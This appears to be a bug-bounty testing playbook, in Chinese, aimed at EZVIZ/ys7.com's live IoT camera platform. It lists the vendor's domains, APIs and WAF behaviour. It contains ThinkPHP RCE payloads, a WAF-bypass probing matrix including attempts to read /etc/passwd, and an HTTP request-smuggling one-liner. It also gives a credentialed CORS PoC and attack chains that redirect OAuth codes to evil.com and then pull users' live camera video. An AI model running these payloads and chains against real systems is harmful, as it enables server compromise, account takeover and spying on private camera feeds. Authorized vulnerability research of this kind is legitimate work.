---
name: ezviz-src-testing-patterns
description: 萤石/EZVIZ SRC渗透测试模式 - IoT设备API/OAuth认证/ThinkPHP RCE/WAF绕过/SRC拒绝模式
category: penetration-testing-learning
tags: [src, ezviz, iot, camera, oauth, thinkphp, waf, openresty]
---

# EZVIZ萤石SRC测试模式 (2026-05-14)

## 目标范围
- *.ys7.com (scc-chat.ys7.com除外)
- *.ezvizlife.com
- *.eziot.com
- *.ezviz7.com
- *.guardingvision.com
- *.hicloudcam.com
- *.shipin7.com
- *.hik-connect.com
- *.hikops.com

核心应用: open.ys7.com, www.ys7.com, 觅讯, 睛小豆, 萤石云视频app

## 技术栈指纹
- 前端: Tengine (阿里云定制nginx) + Vue.js SPA + Next.js SPA
- 后端: Java (Tomcat 8.0.36) + PHP (ThinkPHP)
- WAF: 阿里云WAF (acw_tc cookie) + openRASP (x-protected-by: openRASP)
- CDN: 阿里云OSS (x-oss-request-id header)
- 认证: OAuth 2.0 (openauth.ys7.com) + JSESSIONID
- IoT API: appKey+appSecret → accessToken (7天有效期)

## 关键域名矩阵
| 域名 | 用途 | 后端 | 防护 |
|------|------|------|------|
| open.ys7.com | IoT开放平台 | Next.js + Tomcat | 阿里云WAF |
| auth.ys7.com | 用户认证中心 | Java (Tomcat 8.0.36) | openRASP |
| openauth.ys7.com | OAuth认证中心 | Java (PS) | - |
| store.ys7.com | 商城系统 | PHP (ThinkPHP) | openRASP |
| www.ys7.com | 官网 | Java | 阿里云WAF |
| mfs.ys7.com | OSS文件存储 | OpenResty + 阿里云OSS | - |
| dealer.ezvizlife.com | 经销商门户 | Vue.js SPA | - |
| es.ys7.com | 管理后台 | Vue.js SPA | - |
| waf.ys7.com | WAF管理接口 | Tengine | 403访问控制 |
| stats.ys7.com | 统计服务 | JavaScript | openRASP |
| mobile.ys7.com | 移动端API | Java | 认证拦截(401:46) |
| pbauth.ys7.com | 认证服务 | Java | openRASP |
| appdownload.ys7.com | APK下载 | OpenResty | 403访问控制 |

### 开发者控制台 (open.ys7.com/console)
- /console → 302 → /console/home.html (需要登录)
- /console/api/apps → 302 → /auth?r=...&returnUrl=... (需要认证)
- /console/api/developer/info → 302 (需要认证)
- /console/api/app/list → 302 (需要认证)
- 认证入口: /auth → 登录页面

### 移动端API (mobile.ys7.com)
- /api/device/list → 401:46 (需要认证)
- /api/device/add → 401:46 (需要认证)
- /api/user/login → 405:86 (方法不允许)
- /api/token/verify → 000:0 (连接被杀)
- 认证方式: Bearer token
- 错误响应: {"resultCode":"-3","resultDes":"Unauthorized"}

## ⚠️ SRC拒绝模式（不要报告！）—— 实战验证 (2026-05-14)

### 被SRC否定的漏洞类型（5个全部被忽略）
1. **CORS配置缺陷** - SRC认为bucket只含公开图片，无实质危害
2. **.git目录泄露** - SRC认为被WAF拦截=不可利用
3. **OAuth开放重定向** - SRC认为需要用户交互，不直接判定高危
4. **敏感文件存在但被拦截** - SRC认为openRASP拦截=不可利用
5. **ThinkPHP RCE WAF响应差异** - SRC认为被WAF拦截=不可利用

### 教训：SRC只收有实质危害的漏洞
- 不要报告"存在但被拦截"的漏洞
- 不要报告"需要用户交互"的漏洞
- 不要报告"无实质数据泄露"的漏洞
- 必须有实际利用成功+数据泄露/权限获取的证据

### SRC看重的漏洞类型（严重/高危）
1. **获取任意用户摄像头视频** - 通过API越权直接获取，需影响≥1000用户
2. **RCE** - 命令注入、远程命令执行、上传WebShell
3. **严重信息泄露** - SQL注入泄露≥10万条敏感信息
4. **核心系统越权** - 任意账号登录、任意密码修改
5. **内网SSRF** - 能直接访问萤石内网且可完全回显

## IoT开放平台API (open.ys7.com)

### API认证流程
```
1. 注册开发者账号 → 获取appKey+appSecret
2. POST /api/lapp/token/get {appKey, appSecret} → 获取accessToken
3. 使用accessToken调用设备API
```

### 关键API端点
```
POST /api/lapp/token/get → 获取token (需appKey+appSecret)
POST /api/lapp/token/refresh → 刷新token (需accessToken)
POST /api/lapp/device/list → 设备列表 (需accessToken)
POST /api/lapp/device/info → 设备详情 (需accessToken+deviceSerial)
POST /api/lapp/camera/list → 摄像头列表 (需accessToken)
POST /api/lapp/video/live/playAddress → 实时视频流 (需accessToken+deviceSerial+channelNo)
POST /api/lapp/video/history/playAddress → 历史视频 (需accessToken+deviceSerial+channelNo+startTime+endTime)
POST /api/lapp/alarm/list → 告警列表 (需accessToken+deviceSerial)
POST /api/lapp/device/add → 添加设备 (需accessToken)
POST /api/lapp/device/delete → 删除设备 (需accessToken)
```

### API错误码
```
10001 = 参数为空 (appKey/appSecret/accessToken不能为空)
10002 = accessToken过期或参数异常
10017 = appKey不存在
-1 = 未知错误
```

### 高价值攻击方向
1. **appKey/appSecret泄露** - 从SDK源码、APK逆向、GitHub搜索
2. **accessToken IDOR** - 测试不同accessToken是否可访问他人设备
3. **deviceSerial枚举** - 测试设备序列号是否可枚举
4. **视频流未授权访问** - 测试playAddress是否需要认证

## OAuth认证系统 (openauth.ys7.com)

### OAuth流程
```
1. 用户访问: /oauth/authorize?client_id=X&redirect_uri=Y&response_type=code
2. 用户登录 → 获取authorization_code
3. 用code换取accessToken: POST /oauth/token {grant_type=authorization_code, code, redirect_uri}
4. 用accessToken访问用户数据
```

### 已确认漏洞
- **开放重定向**: redirect_uri参数未做白名单校验，接受任意域名
- 攻击链: 钓鱼链接→用户登录→重定向到攻击者域名→窃取授权码

### OAuth端点
```
GET /oauth/authorize → 授权页面 (接受任意redirect_uri)
POST /oauth/token → 获取token
GET /oauth/check_token → 验证token
GET /logout → 登出
```

## ThinkPHP RCE (store.ys7.com)

### 框架确认
```
/index.php?s=captcha → 302:0 (ThinkPHP验证码端点)
/admin.php/admin_user/index/login → 200:8683 (管理后台)
```

### RCE Payload
```
# ThinkPHP 5.0.x
/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

# ThinkPHP 5.1.x
/index.php?s=/index/\think\Request/input&filter=phpinfo&data=1
/index.php?s=/index/\think\Request/input&filter=system&data=id
```

### WAF响应差异（关键发现！）
```
418:6357 = WAF标准拦截页（文件存在但被规则匹配）
000:0 = 连接被WAF主动杀死（更高风险的攻击模式）
403:40 = openRASP拦截
302:0 = 需要认证
```

### 完整函数GET vs POST差异矩阵
```
函数                  GET响应    POST响应   差异?
phpinfo              000:0      000:0      两者都000
system               418:6357   418:6357   WAF拦截
exec                 418:6357   418:6357   WAF拦截
passthru             000:0      418:6357   ← WAF绕过可能!
shell_exec           418:6357   418:6357   WAF拦截
proc_open            418:6357   418:6357   WAF拦截
popen                000:0      418:6357   ← WAF绕过可能!
assert               418:6357   418:6357   WAF拦截
eval                 418:6357   418:6357   WAF拦截
call_user_func       418:6357   418:6357   WAF拦截
call_user_func_array 418:6357   000:0      ← 反向差异!
array_map            418:6357   418:6357   WAF拦截
array_filter         000:0      000:0      两者都000
preg_replace         418:6357   418:6357   WAF拦截
create_function      000:0      418:6357   ← WAF绕过可能!
ob_start             418:6357   418:6357   WAF拦截
```

### exec函数不同参数差异
```
exec(id)             → 418:6357 (WAF拦截)
exec(whoami)         → 418:6357 (WAF拦截)
exec(ls)             → 418:6357 (WAF拦截)
exec(pwd)            → 000:0 (连接被杀)
exec(hostname)       → 000:0 (连接被杀)
exec(uname -a)       → 000:0 (连接被杀)
exec(cat /etc/passwd) → 000:0 (连接被杀)
exec(cat /etc/hosts) → 000:0 (连接被杀)
exec(ifconfig)       → 000:0 (连接被杀)
exec(ps aux)         → 000:0 (连接被杀)
exec(echo test)      → 000:0 (连接被杀)
exec(touch /tmp/test) → 000:0 (连接被杀)
exec(netstat)        → 418:6357 (WAF拦截)
exec(env)            → 418:6357 (WAF拦截)
exec(history)        → 418:6357 (WAF拦截)
```

### filter参数差异（data=id固定）
```
passthru       → 418:6357 (WAF拦截)
system         → 418:6357 (WAF拦截)
exec           → 000:0 (连接被杀)
shell_exec     → 000:0 (连接被杀)
popen          → 418:6357 (WAF拦截)
proc_open      → 418:6357 (WAF拦截)
assert         → 418:6357 (WAF拦截)
eval           → 418:6357 (WAF拦截)
create_function → 418:6357 (WAF拦截)
call_user_func → 418:6357 (WAF拦截)
array_filter   → 418:6357 (WAF拦截)
preg_replace   → 418:6357 (WAF拦截)
ob_start       → 418:6357 (WAF拦截)
```

### X-Forwarded-Host绕过测试
```
X-Forwarded-Host: 127.0.0.1 → 418:6357 (WAF拦截)
X-Forwarded-Host: localhost → 418:6357 (WAF拦截)
X-Forwarded-Host: store.ys7.com → 000:0 (连接被杀!) ← 特殊!
X-Forwarded-Host: www.ys7.com → 418:6357 (WAF拦截)
X-Forwarded-Host: evil.com → 418:6357 (WAF拦截)
X-Forwarded-Host: 127.0.0.1 + Cookie: PHPSESSID=test → 000:0
```

### 时间延迟异常
```
passthru(sleep 1) → 21.4秒 ← 异常延迟!
passthru(sleep 2) → 2.5秒 (WAF超时)
passthru(sleep 5) → 2.5秒 (WAF超时)
passthru(sleep 10) → 2.5秒 (WAF超时)
create_function(phpinfo()) → 5.002秒 ← 异常延迟!
create_function(exec('id')) → 5.002秒 ← 异常延迟!
```
**注意**: sleep 1的21.4秒延迟非常异常，可能意味着命令实际在执行，但无法通过DNS/HTTP外带验证。

### HTTP请求走私结果
- CL.TE走私成功（获取2个响应）
- 但第二个响应仍被openRASP拦截（302重定向到认证页面）
- 走私到PHP文件返回404
- 结论: openRASP在走私请求中仍然有效

### 敏感文件（存在但被拦截）
```
/.env → 403:40 (openRASP拦截)
/config.yml → 403:40
/database.yml → 000:0 (连接被杀)
/server-info → 403:40
/server-status → 000:0 (连接被杀)
/runtime/log/ → 403:40
/runtime/logs/ → 403:40
/Application/Runtime/Logs/ → 403:40
/phpinfo.php → 000:0 (连接被杀)
/info.php → 000:0 (连接被杀)
/test.php → 200:0 (空响应)
```

## Spring Boot应用 (pbcart.ys7.com)

### 服务信息
- 服务名: mallcartfrontservice (购物车前端服务)
- 版本: 2.1.0.0
- Git提交: 27aa832 (2020-08-01)
- 分支: master
- 框架: Spring Boot + Eureka服务发现

### 暴露端点
```
GET /swagger-ui.html → 200:3246 (Swagger UI暴露!)
GET /info → 200:214 (服务信息泄露)
GET /health → 503:66 (健康状态泄露)
GET /webjars/springfox-swagger-ui/css/screen.css → 200:49189 (Swagger资源)
```

### /info响应（信息泄露）
```json
{
  "description": "mallcartfrontservice",
  "version": "2.1.0.0",
  "name": "mallcartfrontservice",
  "contact": "welcome to mallcartfrontservice",
  "git": {
    "commit": {"time": "2020-08-01T13:48:24Z", "id": "27aa832"},
    "branch": "master"
  }
}
```

### /health响应（服务发现泄露）
```json
{
  "description": "Remote status from Eureka server",
  "status": "DOWN"
}
```

### CORS配置缺陷
- Access-Control-Allow-Origin: 反射任意Origin
- Access-Control-Allow-Credentials: true
- JSESSIONID cookie (HttpOnly)

### 其他Spring Boot子域
```
pbshop.ys7.com → 可能也是Spring Boot
squares.ys7.com → 可能也是Spring Boot
```

### 其他WAF绕过尝试（全部失败）
- HTTP/2协议: 418:6357
- 分块编码: 418:6357
- URL编码: 418:6357
- 双重URL编码: 418:6357
- 不同User-Agent: 418:6357
- X-Forwarded-For: 418:6357
- Referer: 418:6357
- Cookie: 418:6357

## .git目录泄露

### 受影响子域（16个）
```
www.ys7.com, es.ys7.com, ysrc.ys7.com, service.ys7.com,
pbauth.ys7.com, store.ys7.com, iot.ys7.com, mallvr.ys7.com,
eziot.com, pbcart.ys7.com, stats.ys7.com, m.ys7.com,
hik-connect.com, guardingvision.com, hicloudcam.com, hikops.com
```

### WAF绕过技术
```
# 编码绕过
/.git/HEAD%0a → 302:0 (换行绕过)
/.git/HEAD%0d%0a → 302:0 (回车换行绕过)
/.git/HEAD%09 → 302:0 (制表符绕过)

# HTTP请求走私 (CL.TE)
printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /.git/HEAD HTTP/1.1\r\nHost: target\r\n\r\n' | openssl s_client -quiet -connect target:443 -servername target
```

## CORS漏洞 (mfs.ys7.com)

### 配置缺陷
- Access-Control-Allow-Origin: 反射任意Origin
- Access-Control-Allow-Credentials: true
- Access-Control-Allow-Headers: *
- Access-Control-Allow-Methods: *

### OSS Bucket信息
- Bucket名: mall-files
- 区域: oss-cn-hangzhou-internal
- 文件路径: /mall/[hash]_[size].jpg

### PoC
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://mfs.ys7.com/mall/[file]", true);
xhr.withCredentials = true;
xhr.onload = function() { alert(xhr.responseText.length); };
xhr.send();
</script>
```

## 高价值攻击链

### 攻击链1: OAuth→摄像头视频（严重）
```
1. 构造钓鱼链接: https://openauth.ys7.com/oauth/authorize?client_id=X&redirect_uri=https://evil.com&response_type=code
2. 用户登录 → 获取authorization_code
3. 用code换取accessToken
4. 调用 /api/lapp/device/list → 获取用户设备列表
5. 调用 /api/lapp/video/live/playAddress → 获取摄像头视频流
```

### 攻击链2: appKey泄露→设备控制（严重）
```
1. 从SDK/APK/GitHub找到有效appKey+appSecret
2. 调用 /api/lapp/token/get 获取accessToken
3. 枚举deviceSerial → 访问他人设备
4. 调用设备API → 控制摄像头/智能设备
```

### 攻击链3: ThinkPHP RCE→服务器权限（严重）
```
1. 确认ThinkPHP框架
2. 使用RCE payload绕过WAF
3. 执行系统命令 → 获取服务器权限
4. 读取配置文件 → 获取数据库凭证
5. 横向移动 → 访问内网其他服务
```

## SRC提交要点

### 漏洞盒子(VulBox)报告标准
1. **漏洞标题**: 简明扼要，格式"xxx站xxx处存在xxx漏洞"
2. **基本信息**: 漏洞类型/等级/厂商信息准确无误
3. **漏洞描述**: 包含漏洞概述和危害
4. **漏洞正文**:
   - 复现过程完整，无需二次沟通或补充数据
   - 分步骤图文描述，每步骤配图文
   - 厂商可根据描述一次性完成复测
   - 漏洞危害证明完整无误
   - URL及重要参数完整无误
   - 格式排版规范，描述用语专业化规范化
5. **修复建议**: 对开发有较大实用性（修复思路、代码样式、伪代码等）

### 萤石SRC格式要求
- 纯文本不用HTML
- 标题格式: "萤石-系统名，存在XX漏洞"
- 复现步骤用curl命令+返回结果
- CVSS评分需给出向量字符串
- **重点: 必须有实质危害证据，不要报告被拦截的漏洞**
